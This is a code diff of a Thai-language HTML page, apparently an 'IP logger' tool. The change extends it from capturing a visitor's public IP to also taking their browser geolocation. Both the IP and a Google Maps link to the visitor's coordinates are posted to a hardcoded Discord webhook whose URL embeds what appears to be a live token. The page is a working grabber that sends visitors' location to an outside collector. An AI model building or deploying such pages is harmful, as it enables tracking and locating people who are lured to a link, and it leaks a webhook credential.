@@ -3,38 +3,53 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IP Capture</title>
+    <title>IP and Location Capture</title>
     <script>
-        // ฟังก์ชันในการดึง IP และส่งไปยัง Discord Webhook
-        async function captureAndSendIp() {
-            // ดึง IP จาก ipify API
-            const response = await fetch('https://api.ipify.org?format=json');
-            const data = await response.json();
-            const ip = data.ip;
+        // ฟังก์ชันในการดึง IP และตำแหน่งที่อยู่ของผู้ใช้
+        async function captureAndSendData() {
+            // ดึง IP ของผู้ใช้จาก ipify API
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            const ip = ipData.ip;
 
-            // กำหนด Payload สำหรับ Discord Webhook
-            const payload = {
-                content: `IP ที่กดเข้ามาคือ: ${ip}`
-            };
+            // ดึงตำแหน่งที่อยู่ของผู้ใช้ผ่าน Geolocation API
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(async function(position) {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
 
-            // ส่งข้อมูล IP ไปยัง Discord Webhook
-            const webhookUrl = 'https://discord.com/api/webhooks/1302448307775471646/v4lagRRls5NHggJWwlaWPfIpsz3isk0xLeYG7bECQl799ijnAkHECqgIq4GfT2_Lrxgk'; // แทนค่า Webhook ที่คุณต้องการ
-            await fetch(webhookUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(payload),
-            });
+                    // สร้าง Google Maps Link ที่เชื่อมไปยังตำแหน่งของผู้ใช้
+                    const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
 
-            // แสดงข้อความว่า IP ถูกบันทึกแล้ว
-            alert("IP ถูกบันทึกและส่งไปยัง Discord Webhook เรียบร้อยแล้ว!");
+                    // สร้าง Payload ที่จะส่งไปยัง Discord Webhook
+                    const payload = {
+                        content: `IP: ${ip}\nตำแหน่ง: https://www.google.com/maps?q=${latitude},${longitude}`
+                    };
+
+                    // ส่งข้อมูล IP และตำแหน่งไปยัง Discord Webhook
+                    const webhookUrl = 'https://discord.com/api/webhooks/1302448307775471646/v4lagRRls5NHggJWwlaWPfIpsz3isk0xLeYG7bECQl799ijnAkHECqgIq4GfT2_Lrxgk'; // แทนค่า Webhook ที่คุณต้องการ
+                    await fetch(webhookUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(payload),
+                    });
+
+                    // แสดงข้อความว่า IP และตำแหน่งถูกบันทึกแล้ว
+                    alert("IP และตำแหน่งถูกบันทึกและส่งไปยัง Discord Webhook เรียบร้อยแล้ว!");
+                }, function(error) {
+                    alert("ไม่สามารถดึงตำแหน่งได้.");
+                });
+            } else {
+                alert("Geolocation API ไม่รองรับในเบราว์เซอร์นี้.");
+            }
         }
     </script>
 </head>
 <body>
-    <h1>ยินดีต้อนรับ! กดลิงก์เพื่อบันทึก IP ของคุณ</h1>
-    <!-- ลิงก์เมื่อคลิกจะดึง IP และส่งไปยัง Discord Webhook -->
-    <a href="javascript:void(0);" onclick="captureAndSendIp()">คลิกที่นี่เพื่อบันทึก IP</a>
+    <h1>ยินดีต้อนรับ! กดลิงก์เพื่อบันทึก IP และตำแหน่งของคุณ</h1>
+    <!-- ลิงก์เมื่อคลิกจะดึง IP และตำแหน่ง แล้วส่งไปยัง Discord Webhook -->
+    <a href="javascript:void(0);" onclick="captureAndSendData()">คลิกที่นี่เพื่อบันทึก IP และตำแหน่ง</a>
 </body>
 </html>
